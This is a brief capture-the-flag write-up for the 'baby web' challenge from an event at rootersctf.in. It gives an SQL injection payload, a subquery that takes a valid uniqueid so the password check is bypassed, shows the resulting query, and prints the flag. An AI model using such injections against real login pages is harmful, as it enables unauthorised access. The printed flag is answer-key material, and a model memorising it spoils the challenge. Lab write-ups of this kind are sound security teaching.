# baby web

## Web - Points: 450

> <p>My junior dev just set up a password protected webpage. Can you get in?</p>
>
>  
>
> https://babyweb.rootersctf.in/
>
> 
>
> 
>
> **Author: @mr_goron**
>

SQL injection of `(select uniqueid from users limit 1)` performs a subquery to get a valid id and results in the following query:

`SELECT * FROM users WHERE uniqueid=(select uniqueid from users limit 1)`

flag: `rooters{J00_kN0W_5QL_1nJ3c710n}ctf`